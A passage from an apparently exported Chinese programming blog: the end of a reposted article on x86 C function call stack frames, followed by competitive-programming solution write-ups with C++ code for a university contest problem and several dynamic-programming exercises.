%ebp, %esp<span style="color: #ff0000;"><em></em></span></p><br></td><br><td valign="top" width="465"><br><p align="left">恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理)</p><br></td><br></tr><br><tr><br><td width="130"><br><p>pop %ebp<span style="color: #ff0000;"></span></p><br></td><br><td valign="top" width="465"><br><p align="left">主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处</p><br></td><br></tr><br><tr><br><td width="130"><br><p>ret</p><br></td><br><td valign="top" width="465"><br><p align="left">从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈</p><br></td><br></tr><br><tr><br><td colspan="3" width="678"><br><p align="left"><span style="color: #ff0000;">*</span>：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。</p><br></td><br></tr><br></tbody><br></table><p>若主调函数和调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无须在函数序中对其压栈，以便提高程序的执行效率。</p><p>参数压栈指令因编译器而异，如下两种压栈方式基本等效：</p><table style="margin-left: auto; margin-right: auto;" border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td colspan="2" valign="top" width="614"><br><p>extern CdeclDemo(int w, int x, int y, intz);&nbsp; //调用CdeclDemo函数</p><br><p>CdeclDemo(1, 2, 3, 4);&nbsp; //调用CdeclDemo函数</p><br></td><br></tr><br><tr style="background-color: #857c7a;"><br><td valign="top" width="311"><br><p align="center"><strong>压栈方式一</strong></p><br></td><br><td valign="top" width="304"><br><p align="center"><strong>压栈方式二</strong></p><br></td><br></tr><br><tr><br><td valign="top" width="311"><br><p>pushl 4&nbsp; //压入参数z</p><br><p>pushl 3&nbsp; //压入参数y</p><br><p>pushl 2&nbsp; //压入参数x</p><br><p>pushl 1&nbsp; //压入参数w</p><br><p>call CdeclDemo &nbsp;//调用函数</p><br><p>addl $16, %esp&nbsp; //恢复ESP原值，使其指向调用前保存的返回地址</p><br></td><br><td valign="top" width="304"><br><p><em>subl&nbsp;&nbsp; $16, %esp</em> //多次调用仅执行一遍</p><br><p>movl&nbsp; $4, 12(%esp) //传送参数z至堆栈第四个位置</p><br><p>movl&nbsp; $3, 8(%esp) //传送参数y至堆栈第三个位置</p><br><p>movl&nbsp; $2, 4(%esp) //传送参数x至堆栈第二个位置</p><br><p>movl&nbsp; $1, (%esp) //传送参数w至堆栈栈顶</p><br><p>call CdeclDemo &nbsp;//调用函数</p><br></td><br></tr><br></tbody><br></table><p>两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。gcc3.4(或更高版本)编译器采用该技术将函数参数传递至栈上，相比栈顶指针随每次参数压栈而多次下移，一次性设置好栈顶指针更为高效。设想连续调用多个函数时，方式二仅需预先分配一次参数内存(大小足够容纳参数尺寸和最大的函数即可)，后续调用无需每次都恢复栈顶指针。注意，函数被调用时，两种方式均使栈顶指针指向函数最左边的参数。本文不再区分两种压栈方式，”压栈”或”入栈”所提之处均按相应汇编代码理解，若无汇编则指方式二。</p><p>某些情况下，编译器生成的函数调用进入/退出指令序列并不按照以上方式进行。例如，若C函数声明为static(只在本编译单元内可见)且函数在编译单元内被直接调用，未被显示或隐式取地址(即没有任何函数指针指向该函数)，此时编译器确信该函数不会被其它编译单元调用，因此可随意修改其进/出指令序列以达到优化目的。</p><p>尽管使用的寄存器名字和指令在不同处理器架构上有所不同，但创建栈帧的基本过程一致。</p><p>注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。</p><p><em>以上全文转载自：<a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">C语言函数调用栈(一)</a></em></p>]]></content>
      
      
        <tags>
            
            <tag> Basic </tag>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018广东工业大学校赛题解</title>
      <url>/blog/2018/03/25/2018-gdut/</url>
      <content type="html"><![CDATA[<h3 id="C-平分游戏"><a href="#C-平分游戏" class="headerlink" title="C-平分游戏"></a><a href="https://www.nowcoder.com/acm/contest/90/C" target="_blank" rel="noopener">C-平分游戏</a></h3><p>先不考虑是隔$k$个人，直接当成每次逆时针加$k$。那么原图中的$n$个人划分为若干个环，每个环都是独立的，这里取一个四元环继续讲解。<br><img src="https://img-blog.csdn.net/20180325101139977" alt=""></p><p>假设四个人原先有的钱为$S_i$，逆时针收到的钱为$x_i$（负数即反向），需要达到平均值$A$，那么有<br>$$<br>\left\{<br>\begin{array}{c}<br>S_1+x_1-x_2=A \\<br>S_2+x_2-x_3=A \\<br>S_3+x_3-x_4=A \\<br>S_4+x_4-x_1=A<br>\end{array}<br>\right.<br>$$<br>一行一行加，解得：<br>$$<br>\left\{<br>\begin{array}{c}<br>x_1=&amp;x_1 &amp;\triangleq x_1-y_1 \\<br>x_2=&amp;x_1-(A-S_1) &amp;\triangleq x_1-y_2 \\<br>x_3=&amp;x_1-((A-S_1)+(A-S_2)) &amp;\triangleq x_1-y_3 \\<br>x_4=&amp;x_1-((A-S_1)+(A-S_2)+(A-S_3)) &amp;\triangleq x_1-y_4<br>\end{array}<br>\right.<br>$$<br>这个环所需要的总时间为$T=|x_1|+|x_2|$ $+|x_3|+|x_4|$ $=|x_1-y_1|+|x_1-y_2|$ $+|x_1-y_3|+|x_1-y_4|$，由绝对值数形结合的知识可知当$x_1$取$y_i$的中位数（不计平均）时该式最小。<br>对于这道题，可以先求出总的平均值$A$，然后每个环都用这个$A$列方程和验证，答案累加即可。<br>最后说一下$k$的问题，题意不是很清晰，最终确定隔$n-1$个人是可以的（相当于相邻），隔$n$个人是不可以的（没有实际意义）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1000010</span>;</div><div class="line">ll s[N];</div><div class="line"><span class="keyword">bool</span> vis[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,k;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;k);</div><div class="line">    ++k;</div><div class="line">    ll sum=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;s[i]);</div><div class="line">        sum+=s[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (sum%n) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"gg"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    ll A=sum/n,ans=<span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        cnt+=(s[i]==A);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (cnt==n) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"0"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (k&gt;n) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"gg"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">bool</span> good=<span class="literal">true</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (vis[i]) <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">int</span> j=i;</div><div class="line">        ll tmp=<span class="number">0</span>;</div><div class="line">        <span class="built_in">vector</span>&lt;ll&gt; ve;</div><div class="line">        <span class="keyword">do</span> &#123;</div><div class="line">            vis[j]=<span class="literal">true</span>;</div><div class="line">            tmp+=A-s[j];</div><div class="line">            ve.push_back(tmp);</div><div class="line">            j=(j+k)%n;</div><div class="line">        &#125; <span class="keyword">while</span> (j!=i);</div><div class="line">        <span class="keyword">if</span> (tmp) &#123;</div><div class="line">            good=<span class="literal">false</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        sort(begin(ve),end(ve));</div><div class="line">        ll x=ve[ve.size()/<span class="number">2</span>];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> y:ve) &#123;</div><div class="line">            ans+=<span class="built_in">abs</span>(x-y);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!good) &#123;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">"gg"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HHUACM 寒假专题 动态规划</title>
      <url>/blog/2018/02/25/hhutraining3/</url>
      <content type="html"><![CDATA[<h3 id="F-数塔"><a href="#F-数塔" class="headerlink" title="F - 数塔"></a><a href="https://vjudge.net/problem/HDU-2084" target="_blank" rel="noopener">F - 数塔</a></h3><p>经典问题，数塔。<br>使用动态规划解决问题的（最重要）前提是：</p><ol><li>问题具有最优子结构</li><li>最优子结构的状态可以记录</li></ol><p><img src="http://acm.hdu.edu.cn/data/images/2084-1.jpg" alt=""><br>例如上图中，以第二层$12$为顶层的数塔就是一个最优子结构。<br>再回到原来的顶层，想得到最终的结果只需要知道第二层两个子结构能得到的最大和，这是可记录的。<br>所以，我们从底层往顶层进行动态规划就可以了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> a[<span class="number">111</span>][<span class="number">111</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i][j]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</div><div class="line">                a[i][j]+=max(a[i+<span class="number">1</span>][j],a[i+<span class="number">1</span>][j+<span class="number">1</span>]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,a[<span class="number">1</span>][<span class="number">1</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="G-免费馅饼"><a href="#G-免费馅饼" class="headerlink" title="G - 免费馅饼"></a><a href="https://vjudge.net/problem/HDU-1176" target="_blank" rel="noopener">G - 免费馅饼</a></h3><p>可以发现时刻的范围不是很大，把每个时刻看作每一层，这个问题就是三条边的数塔。<br>代码中平移一下是为了避免越界问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">int</span> dp[N][<span class="number">13</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n),n) &#123;</div><div class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</div><div class="line">        <span class="keyword">int</span> m=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> x,t;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;t);</div><div class="line">            ++dp[t][x+<span class="number">1</span>];</div><div class="line">            m=max(m,t);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=m;i&gt;=<span class="number">0</span>;i--) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">11</span>;j++) &#123;</div><div class="line">                dp[i][j]+=max(max(dp[i+<span class="number">1</span>][j<span class="number">-1</span>],dp[i+<span class="number">1</span>][j]),dp[i+<span class="number">1</span>][j+<span class="number">1</span>]);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dp[<span class="number">0</span>][<span class="number">6</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="A-饭卡"><a href="#A-饭卡" class="headerlink" title="A - 饭卡"></a><a href="https://vjudge.net/problem/HDU-2546" target="_blank" rel="noopener">A - 饭卡</a></h3><p>首先排除余额已经少于$5$的情况，然后分为$m-5$和$5$两部分，前面的$m-5$是个01背包问题，后面的$5$用来买最后一次。若用$dp(x)$表示$x$能买到的最大价值，那么答案为$m-dp(m-5)-a_i (1\le i\le n)$。<br>可以证明，最后买最贵的是最优的。比较复杂，这里仅通过$m-dp(m-5)-a_p$这个式子简要说明，如果最后买的不是最贵的，即 $p’ \neq p$：</p><ul><li>$a_{p’}\le a_{p}$</li><li>背包的物品集合加入了一个体积大的，去掉了一个体积小的；又有价值跟体积的值相等，所以$dp’(m-5)\le dp(m-5)$</li></ul><p>两个减数都减小，最后的结果只会变大。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1100</span>;</div><div class="line"><span class="keyword">int</span> a[N],dp[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n),n) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</div><div class="line">        <span class="keyword">if</span> (m&lt;<span class="number">5</span>) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,m);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">int</span> p=max_element(a+<span class="number">1</span>,a+n+<span class="number">1</span>)-a;</div><div class="line">            m-=<span class="number">5</span>;</div><div class="line">            <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">                <span class="keyword">if</span> (i==p) <span class="keyword">continue</span>;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=m;j&gt;=a[i];j--) &#123;</div><div class="line">                    dp[j]=max(dp[j],dp[j-a[i]]+a[i]);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,m+<span class="number">5</span>-dp[m]-a[p]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="B-Piggy-Bank"><a href="#B-Piggy-Bank" class="headerlink" title="B - Piggy-Bank"></a><a href="https://vjudge.net/problem/HDU-1114" target="_blank" rel="noopener">B - Piggy-Bank</a></h3><p>已知存钱罐的确切重量，问最小可能价值。是恰好型的完全背包。<br>稍微讲一下完全背包一维的转移方程：<br>$$dp(j)=max(dp(j),dp(j-w_i)+v_i)$$ $j$从小到大枚举时，由于之前的$dp$值已经更新过了，就直接达到了无限个物品的效果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">10010</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">0x3f3f3f3f</span>;</div><div class="line"><span class="keyword">int</span> dp[M];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n,m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        m-=n;</div><div class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</div><div class="line">        dp[<span class="number">0</span>]=<span class="number">0</span>; <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> p,w;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;p,&amp;w);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=w;j&lt;=m;j++) &#123;</div><div class="line">                dp[j]=min(dp[j],dp[j-w]+p);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (dp[m]==INF) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"This is impossible."</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"The minimum amount of money in the piggy-bank is %d.\n"</span>,dp[m]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="C-Investment"><a href="#C-Investment" class="headerlink" title="C - Investment"></a><a href="https://vjudge.net/problem/HDU-1963" target="_blank" rel="noopener">C - Investment</a></h3><p>给出本金、很多种债券和各自的利息，问$y$年以后最多能有多少钱，抽象一下就是做$y$次完全背包。<br>但是这题里面容量太大了做不了完全背包，所以题目里又给了一个条件，债券的价格都是$1000$的整数倍，那么直接把本金除以$1000$当作背包容量就行了，重复做$y$次。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> w[<span class="number">22</span>],v[<span class="number">22</span>];</div><div class="line"><span class="keyword">int</span> dp[<span class="number">50000</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> n,M,Y;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;M,&amp;Y);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;w[i],&amp;v[i]);</div><div class="line">            w[i]/=<span class="number">1000</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">while</span> (Y--) &#123;</div><div class="line">            <span class="keyword">int</span> m=M/<span class="number">1000</span>;</div><div class="line">            <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=w[i];j&lt;=m;j++) &#123;</div><div class="line">                    dp[j]=max(dp[j],dp[j-w[i]]+v[i]);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            M+=dp[m];</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,M);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="D-Common-Subsequence"><a href="#D-Common-Subsequence" class="headerlink" title="D - Common Subsequence"></a><a href="https://vjudge.net/problem/HDU-1159" target="_blank" rel="noopener">D - Common Subsequence</a></h3><p>经典问题，最长公共子序列。<br><img src="http://img.blog.csdn.net/20160529225550069" alt="子串与子序列"><br>设$C(i,j)$为$x_{1\dots i}$和$y_{1\dots j}$的最长公共子序列的长度，那么有：<br>$$\large C(i,j)=\begin{cases}<br>0 &amp; \text{$i=0$ or $j=0$} \\<br>C(i-1,j-1)+1 &amp; i,j\gt 0, x_i=y_j \\<br>max(C(i,j-1),C(i-1,j)) &amp; i,j \gt 0, x_i\neq y_j<br>\end{cases}$$ 第一种情况很好理解。第二种情况就是$x_i$和$y_j$用来匹配了，所以等于了这两个都不用的情况$C(i-1,j-1)$加$1$。第三种情况就是不用$x_i$或者不用$y_j$取一个最大值。<br>其实第三种是最基本的情况，但是由于$max(C(i,j-1),C(i-1,j))$不会比$C(i-1,j-1)+1$更优（为什么？），所以第二种情况中可以不考虑第三种。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">char</span> a[<span class="number">1010</span>],b[<span class="number">1010</span>];</div><div class="line"><span class="keyword">int</span> dp[<span class="number">1010</span>][<span class="number">1010</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span 